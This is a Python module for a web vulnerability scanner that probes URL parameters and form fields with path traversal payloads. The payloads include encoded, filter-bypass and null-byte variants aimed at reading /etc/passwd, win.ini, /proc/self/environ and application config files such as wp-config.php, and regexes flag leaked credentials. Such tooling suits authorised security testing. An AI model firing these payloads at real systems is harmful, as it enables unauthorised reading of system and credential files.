import logging
from urllib.parse import urlparse, parse_qs, quote
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union

logger = logging.getLogger(__name__)

class PathTraversalScanner:
    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        
        # Payloads for Path Traversal testing
        self.payloads = [
            # Basic path traversal
            "../",
            "..\\",
            "../../../",
            "..\\..\\..\\",
            
            # Encoded path traversal
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",
            
            # Double encoded path traversal
            "%252e%252e%252f",
            "%252e%252e/",
            
            # Path traversal with target files
            "../etc/passwd",
            "..\\windows\\win.ini",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            
            # Bypassing filters
            "..././",
            "...\\.\\",
            ".../.../.../",
            "...\\...\\...\\",
            "....//",
            "....\\\\",
            
            # Null byte injection
            "../etc/passwd%00",
            "..\\windows\\win.ini%00",
            "../../../etc/passwd%00.jpg",
            "..\\..\\..\\windows\\win.ini%00.jpg",
            
            # Specific application paths
            "/var/www/html/",
            "/usr/local/etc/",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "C:\\inetpub\\wwwroot\\",
            "C:\\xampp\\htdocs\\",
            
            # Web server config files
            "../.htaccess",
            "../web.config",
            "../../../.htaccess",
            "../../../web.config",
            
            # Application specific files
            "../application.properties",
            "../application.yml",
            "../config.php",
            "../config.json",
            "../wp-config.php",
            "../settings.py"
        ]
        
        # Patterns that might indicate a successful Path Traversal
        self.path_traversal_patterns = [
            # Unix file content patterns
            r"root:.*:0:0:",                       # /etc/passwd
            r"nobody:.*:65534:65534:",             # /etc/passwd
            r"www-data:.*:33:33:",                 # /etc/passwd
            r"\[boot loader\]",                    # win.ini
            r"extension=",                         # php.ini
            
            # Web server config patterns
            r"<VirtualHost",                       # Apache config
            r"<Directory",                         # Apache config
            r"RewriteEngine",                      # .htaccess
            r"<configuration>",                    # web.config
            r"<system.webServer>",                 # web.config
            
            # Application config patterns
            r"DB_CONNECTION|DB_HOST|DB_PORT|DB_DATABASE|DB_USERNAME|DB_PASSWORD", # Laravel .env
            r"DJANGO_SETTINGS_MODULE",             # Django settings
            r"define\s*\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)['\"]", # WordPress config
            r"spring.datasource",                  # Spring application.properties
            r"jdbc:mysql",                         # JDBC connection string
            r"mongodb://",                         # MongoDB connection string
            
            # Error messages that might reveal Path Traversal
            r"(No such file or directory|cannot find the path|file not found|directory not found)",
            r"(fopen|include|require|file_get_contents)\s*\(",
            r"Warning.*failed to open stream",
            r"Exception.*FileNotFoundException",
            r"java\.io\.FileNotFoundException",
            
            # Specific file content signatures
            r"# /etc/fstab",
            r"# /etc/hosts",
            r"proc\s+/proc\s+proc",
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost"
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Look for URL parameters that might be vulnerable to Path Traversal
            path_traversal_prone_params = self._identify_path_traversal_prone_params(params)
            
            if params:
                for param in params:
                    # Prioritize suspicious parameters
                    if param in path_traversal_prone_params:
                        for payload in self.payloads:
                            try:
                                test_url = self._inject_payload(url, param, payload)
                                response = self.client.get(test_url, timeout=5)
                                
                                if response and self._is_vulnerable(response.text, payload):
                                    vulnerabilities.append({
                                        'type': 'Path Traversal',
                                        'url': test_url,
                                        'payload': payload,
                                        'evidence': self._get_evidence(response.text, payload),
                                        'severity': 'high',
                                        'param': param,
                                        'method': 'GET'
                                    })
                            except Exception as e:
                                logger.error(f"Path Traversal GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        # Find fields that might be vulnerable to Path Traversal
                        path_traversal_prone_fields = self._identify_path_traversal_prone_fields(form_fields)
                        
                        for field in form_fields:
                            field_name = field.get('name') if isinstance(field, dict) else field
                            
                            # Prioritize suspicious fields
                            if field_name in path_traversal_prone_fields:
                                for payload in self.payloads:
                                    try:
                                        test_data = {}
                                        for f in form_fields:
                                            f_name = f.get('name') if isinstance(f, dict) else f
                                            test_data[f_name] = payload if f_name == field_name else 'test'
                                        
                                        if method == 'POST':
                                            response = self.client.post(action, data=test_data, timeout=5)
                                        elif method == 'GET':
                                            response = self.client.get(action, params=test_data, timeout=5)
                                        else:
                                            logger.warning(f"Unsupported form method: {method}")
                                            continue
                                        
                                        if response and self._is_vulnerable(response.text, payload):
                                            vulnerabilities.append({
                                                'type': 'Path Traversal',
                                                'url': action,
                                                'payload': payload,
                                                'evidence': self._get_evidence(response.text, payload),
                                                'severity': 'high',
                                                'param': field_name,
                                                'method': method
                                            })
                                    except Exception as e:
                                        logger.error(f"Path Traversal form scan error for field {field_name}: {str(e)}")
                    except Exception as e:
                        logger.error(f"Path Traversal form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"Path Traversal scan error: {str(e)}")
        
        return vulnerabilities

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check for patterns that indicate successful Path Traversal
        for pattern in self.path_traversal_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        # Additional checks for specific payloads
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return True
            
        if "win.ini" in payload and "[boot loader]" in response_text:
            return True
            
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Extract evidence of Path Traversal vulnerability
        for pattern in self.path_traversal_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return f"Path Traversal pattern detected: {match.group(0)}"
                
        # If we couldn't find a specific pattern but determined it's vulnerable
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return "File content leaked: /etc/passwd"
                
        if "win.ini" in payload and "[boot loader]" in response_text:
            return "File content leaked: windows/win.ini"
                
        return "Path Traversal vulnerability detected through response analysis"

    def _identify_path_traversal_prone_params(self, params: Dict) -> List[str]:
        """Identify parameters that are likely to be vulnerable to Path Traversal"""
        path_traversal_prone_params = []
        
        suspicious_names = [
            'path', 'file', 'filepath', 'filename', 'doc', 'document', 'folder', 
            'root', 'directory', 'open', 'load', 'read', 'include', 'require',
            'upload', 'download', 'show', 'display', 'view', 'content', 'dir',
            'page', 'template', 'php_path', 'style', 'template_path', 'module',
            'conf', 'config', 'conf_file', 'settings', 'lang', 'language',
            'locale', 'loc', 'base', 'home', 'install', 'log', 'logs', 'logfile'
        ]
        
        for param in params:
            param_lower = param.lower()
            
            # Check if parameter name suggests file or path handling
            if any(suspicious in param_lower for suspicious in suspicious_names):
                path_traversal_prone_params.append(param)
                
            # Check if parameter value looks like a path
            for value in params[param]:
                if '/' in value or '\\' in value or '..' in value:
                    path_traversal_prone_params.append(param)
                    break
                    
        return path_traversal_prone_params

    def _identify_path_traversal_prone_fields(self, fields: List) -> List[str]:
        """Identify form fields that are likely to be vulnerable to Path Traversal"""
        path_traversal_prone_fields = []
        
        suspicious_names = [
            'path', 'file', 'filepath', 'filename', 'doc', 'document', 'folder', 
            'root', 'directory', 'open', 'load', 'read', 'include', 'require',
            'upload', 'download', 'show', 'display', 'view', 'content', 'dir',
            'page', 'template', 'php_path', 'style', 'template_path', 'module',
            'conf', 'config', 'conf_file', 'settings', 'lang', 'language',
            'locale', 'loc', 'base', 'home', 'install', 'log', 'logs', 'logfile'
        ]
        
        for field in fields:
            field_name = field.get('name') if isinstance(field, dict) else field
            if not field_name:
                continue
                
            field_lower = field_name.lower()
            
            # Check if field name suggests file or path handling
            if any(suspicious in field_lower for suspicious in suspicious_names):
                path_traversal_prone_fields.append(field_name)
                
        return path_traversal_prone_fields
